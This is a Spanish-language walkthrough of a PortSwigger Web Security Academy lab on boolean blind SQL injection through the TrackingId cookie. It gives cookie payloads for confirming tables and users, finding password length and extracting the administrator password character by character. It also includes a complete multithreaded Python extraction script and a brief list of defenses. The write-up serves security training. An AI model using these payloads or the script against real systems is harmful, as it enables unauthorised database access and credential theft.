# Blind SQL injection with conditional responses

**Categoría:** SQLi (Blind)  
**Dificultad:** Practitioner  
**Fuente:** PortSwigger Web Security Academy

***

# 🎯 Resumen

*   **Objetivo del lab**: Explotar una SQLi ciega en la cookie `TrackingId` para obtener la contraseña del usuario `administrator` basándose en cambios en la respuesta.
*   **Vulnerabilidad principal**: Inyección SQL en una consulta cuyo resultado **no se muestra**, pero cuyo resultado afecta a la presencia del mensaje **“Welcome back!”**.
*   **Impacto esperado**: Exposición de credenciales y autenticación como administrador.

***

# 🧭 Reconocimiento

*   **Mapa de la aplicación**: Al visitar la home, la aplicación lee la cookie `TrackingId` y ejecuta una consulta SQL interna con ese valor.

*   **Comportamiento clave**:
    *   Si la consulta devuelve **algún resultado** → aparece **“Welcome back!”**
    *   Si la consulta **no devuelve** filas → el mensaje **no aparece**

*   Esto permite distinguir **TRUE/FALSE** en condiciones que inyectamos.

*   **Prueba de inyección básica**:

    *   TRUE → aparece el mensaje:
        ```http
        Cookie: TrackingId=xyz' AND '1'='1-- -; session=<...>
        ```

    *   FALSE → desaparece el mensaje:
        ```http
        Cookie: TrackingId=xyz' AND '1'='2-- -; session=<...>
        ```

***

# 🛠️ Explotación paso a paso

## Paso 1 – Confirmar que podemos ejecutar comparaciones

Tras ver que `'1'='1'` hace que el mensaje aparezca y `'1'='2'` no, queda claro que la cookie se evalúa dentro del `WHERE` y podemos **inyectar condiciones booleanas**.

***

## Paso 2 – Comprobar existencia de tabla y usuario

**Por qué funciona la comparación `'a'='a'` dentro del `SELECT`:**  
En SQL, una comparación como `(<subconsulta>) = 'a'` **se evalúa una vez** que la subconsulta ha producido un valor escalar. Nuestro patrón:

```sql
(SELECT 'a' FROM users LIMIT 1) = 'a'
```

*   Si **existe** al menos **una fila** en `users`, la subconsulta `SELECT 'a' FROM users LIMIT 1` devuelve la cadena `'a'`. La comparación `'a' = 'a'` es **TRUE** → el `WHERE` completo es TRUE → hay **fila** → aparece **“Welcome back!”**.
*   Si **no existe** la tabla `users` (o no es accesible), la consulta falla (en el lab, suele traducirse en que el backend maneja el error de forma que **no aparece** el mensaje).
*   Si `users` existe pero **no tiene filas** (improbable en el lab), la subconsulta **no devuelve valor** y el predicado no se cumple → **no** aparece el mensaje.

**Comprobación de tabla `users`:**

```http
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'-- -; session=<...>
```

**Comprobación de existencia de `administrator`:**  
El patrón es el mismo, pero añadiendo el filtro en la subconsulta:

```sql
(SELECT 'a' FROM users WHERE username='administrator') = 'a'
```

*   Si hay **alguna fila** con `username='administrator'`, la subconsulta devuelve `'a'` y `'a'='a'` es **TRUE** → aparece el mensaje.
*   Si no existe ese usuario, la subconsulta **no devuelve valor** → la comparación no se cumple → el mensaje **no aparece**.

**Cookie para confirmar usuario `administrator`:**

```http
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'-- -; session=<...>
```

> **Notas rápidas técnicas:**
>
> *   En PostgreSQL/MySQL, `LIMIT 1` asegura que la subconsulta retorne **como mucho** un valor escalar.
> *   Si el motor no soporta `LIMIT`, se usan equivalentes (`TOP 1`, `ROWNUM=1`) y funciones `SUBSTR/SUBSTRING`, `LENGTH/LEN` según el SGBD.

***

## Paso 3 – Determinar longitud de la contraseña (detalle de la lógica)

**Qué evalúa realmente este predicado:**

```sql
(SELECT 'a'
   FROM users
  WHERE username='administrator'
    AND LENGTH(password) > N
) = 'a'
```

*   Si la **condición** `LENGTH(password) > N` es **verdadera** para el `administrator`, la subconsulta **sí devuelve** `'a'`, y `'a'='a'` es **TRUE** → aparece el mensaje.
*   Si es **falsa**, la subconsulta **no devuelve nada** (no hay fila que cumpla el `WHERE`) y el predicado completo no se satisface → el mensaje **no aparece**.

**Estrategia práctica:**

1.  Empieza con `N=1` y ve incrementando hasta que **deje de aparecer** el mensaje.
2.  El primer `N` para el que desaparece indica que la longitud **no es mayor** que ese valor; por tanto, la longitud real es el último valor **verdadero**.
3.  En el lab, el resultado típico es **20**.

**Ejemplo de petición:**

```http
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'-- -; session=<...>
```

***

## Paso 4 – Extraer la contraseña carácter a carácter

**Prueba de igualdad de carácter con `SUBSTRING`** (posición 1, candidato `'a'`):

```http
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- -; session=<...>
```

*   Si aparece el mensaje → el **primer carácter** es `'a'`.
*   Si no → prueba siguiente carácter del conjunto (`a-z0-9` como punto de partida).

**Automatización con Burp Intruder:**

*   Para una sola posición, usa **Simple list** (`a-z`, `0-9`) y **Grep - Match** con “Welcome back”.
*   **Cluster bomb (dos payloads: posición y carácter)**:  
    *Payload 1:* offset de `SUBSTRING` (1..N).  
    *Payload 2:* carácter candidato (`a-z0-9`).  
    Esto recorre todas las combinaciones de (posición, carácter) en una **sola tirada**.  
    **Pero** en **Burp Community** es **muy lento** para grandes combinaciones por limitaciones de velocidad/concurrencia. Para eso **es preferible escribir un script en Python** que controle el flujo, el ritmo y aplique reintentos/validación.

***

# ✅ PoC mínima

```http
# TRUE
Cookie: TrackingId=xyz' AND '1'='1-- -; session=<...>

# Confirmar tabla users
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'-- -; session=<...>

# Confirmar usuario administrator
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'-- -; session=<...>

# Probar primer carácter
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- -; session=<...>
```

***

# 🔒 Defensa

*   Evitar concatenación de valores de cookies en SQL → **consultas parametrizadas**.
*   Mostrar siempre la **misma página** independientemente del resultado de la consulta.
*   Validar y normalizar cookies/headers externos.
*   Aplicar rate‑limiting para impedir enumeraciones.
*   Privilegios mínimos en la cuenta de base de datos.

***

# 📝 Notas y trampas

*   El comentario `-- -` (dos guiones y un espacio) suele ser necesario para anular el resto de la sentencia.
*   Asegura que la cookie llega sin doble-encode ni escapes inesperados.
*   Si el mensaje es inestable, puedes medir también el **tamaño de la respuesta** como señal.

***

# 📚 Referencias

*   [PortSwigger Lab – Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses/)
*   [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

***

# 🧩 Script Python

```python

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from pwn import log

ASCII_MIN, ASCII_MAX = 32, 126
MAX_WORKERS = 6
TIMEOUT = 8

class BlindSQL:
    def __init__(self, url, session_cookie, tracking_cookie):
        self.url = url
        self.session = session_cookie
        self.tracking = tracking_cookie
        self.s = requests.Session()

    def check(self, condition):
        cookie_val = f"{self.tracking}' AND ({condition})-- -"
        cookies = {
            "TrackingId": cookie_val,
            "session": self.session
        }
        r = self.s.get(self.url, cookies=cookies, timeout=TIMEOUT)
        return "Welcome back" in r.text

    def sanity(self):
        return self.check("'1'='1'") and not self.check("'1'='2'")

    def table_exists(self):
        return self.check("(SELECT 'a' FROM users LIMIT 1)='a'")

    def admin_exists(self):
        return self.check("(SELECT 'a' FROM users WHERE username='administrator')='a'")

    def get_length(self, lo=1, hi=64):
        p = log.progress("Longitud")
        while lo < hi:
            mid = (lo + hi) // 2
            p.status(str(mid))
            cond = f"SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{mid}"
            if self.check(f"({cond})='a'"):
                lo = mid + 1
            else:
                hi = mid
        p.success(str(lo))
        return lo

    def get_char(self, pos):
        p = log.progress(f"Pos {pos}")
        lo, hi = ASCII_MIN, ASCII_MAX

        while lo < hi:
            mid = (lo + hi) // 2
            p.status(str(mid))
            cond = f"SELECT ASCII(SUBSTRING(password,{pos},1)) FROM users WHERE username='administrator'"
            if self.check(f"({cond})>{mid}"):
                lo = mid + 1
            else:
                hi = mid

        # Validar
        cand = chr(lo)
        cond2 = f"SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator'"
        if self.check(f"({cond2})='{cand}'"):
            p.success(cand)
            return cand

        p.failure("?")
        return "?"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--session", required=True)
    parser.add_argument("--tracking", required=True)
    args = parser.parse_args()

    b = BlindSQL(args.url, args.session, args.tracking)

    # Sanity
    if not b.sanity():
        log.failure("TRUE/FALSE no estable. Revisa URL/cookies.")
        return
    log.success("Sanity OK")

    # Tabla y usuario
    if not b.table_exists():
        log.failure("Tabla users no accesible.")
        return
    log.success("Tabla users OK")

    if not b.admin_exists():
        log.failure("Usuario administrator no existe.")
        return
    log.success("Usuario administrator OK")

    # Longitud
    length = b.get_length()
    log.info(f"Extrayendo {length} caracteres...")

    # Extracción con hilos
    chars = ["?"] * length

    def worker(pos):
        return pos, b.get_char(pos)

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(worker, pos): pos for pos in range(1, length + 1)}
        for fut in as_completed(futures):
            pos, ch = fut.result()
            chars[pos - 1] = ch
            log.info("Progreso → " + "".join(chars))

    password = "".join(chars)
    log.success(f"Password completa: {password}")


if __name__ == "__main__":
    main()
```